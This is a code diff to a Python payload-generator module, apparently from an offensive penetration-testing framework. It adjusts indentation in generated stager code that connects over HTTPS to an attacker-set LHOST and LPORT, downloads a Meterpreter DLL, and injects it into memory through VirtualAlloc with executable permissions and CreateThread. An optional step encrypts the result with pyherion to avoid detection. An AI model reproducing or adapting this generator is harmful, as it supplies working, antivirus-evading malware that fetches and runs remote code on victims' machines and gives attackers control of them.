@@ -99,7 +99,7 @@ class PayloadModule:
         payload_code +=  '\t' * num_tabs_required + "\t" + proxy_var + " = urllib.request.ProxyHandler({})\n"
         payload_code +=  '\t' * num_tabs_required + "\t" + opener_var + " = urllib.request.build_opener(" + proxy_var + ")\n"
         payload_code +=  '\t' * num_tabs_required + "\turllib.request.install_opener(" + opener_var + ")\n"
-        payload_code +=  '\t' * num_tabs_required + '\t' * num_tabs_required + requestName + " = urllib.request.Request(\"https://\" + " + hostName + " + \":\" + str(" + portName + ") + \"/\" + " + checkinMethodName + "(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
+        payload_code +=  '\t' * num_tabs_required + '\t' + requestName + " = urllib.request.Request(\"https://\" + " + hostName + " + \":\" + str(" + portName + ") + \"/\" + " + checkinMethodName + "(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
         payload_code +=  '\t' * num_tabs_required + "\ttry:\n"
         payload_code +=  '\t' * num_tabs_required + "\t\t%s = urllib.request.urlopen(%s)\n" %(tName, requestName)
         payload_code +=  '\t' * num_tabs_required + "\t\ttry:\n"
@@ -112,7 +112,7 @@ class PayloadModule:
         payload_code +=  '\t' * num_tabs_required + "def %s(%s):\n" %(injectMethodName, dataName)
         payload_code +=  '\t' * num_tabs_required + "\tif %s != \"\":\n" %(dataName)
         payload_code +=  '\t' * num_tabs_required + "\t\t%s = bytearray(%s)\n" %(byteArrayName, dataName)
-        
+
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + " = " + randctypes + ".windll.kernel32.VirtualAlloc(" + randctypes + ".c_int(0)," + randctypes + ".c_int(len(" + byteArrayName + ")), " + randctypes + ".c_int(0x3000)," + randctypes + ".c_int(0x40))\n"
             payload_code += '\t' * num_tabs_required + "\t\t" + bufName + " = (" + randctypes + ".c_char * len(" + byteArrayName + ")).from_buffer(" + byteArrayName + ")\n"
@@ -132,9 +132,9 @@ class PayloadModule:
             payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + handleName + '),' + randctypes + '.c_int(-1))\n'
 
         # download the metpreter .dll and inject it
-        payload_code += "%s = ''\n" %(data2Name)
-        payload_code += "%s = %s(\"%s\", %s)\n" %(data2Name, downloadMethodName, self.required_options["LHOST"][0], self.required_options["LPORT"][0])
-        payload_code += "%s(%s)\n" %(injectMethodName, data2Name)
+        payload_code += '\t' * num_tabs_required + "%s = ''\n" %(data2Name)
+        payload_code += '\t' * num_tabs_required + "%s = %s(\"%s\", %s)\n" %(data2Name, downloadMethodName, self.required_options["LHOST"][0], self.required_options["LPORT"][0])
+        payload_code += '\t' * num_tabs_required + "%s(%s)\n" %(injectMethodName, data2Name)
 
         if self.required_options["USE_PYHERION"][0].lower() == "y":
             payload_code = encryption.pyherion(payload_code)
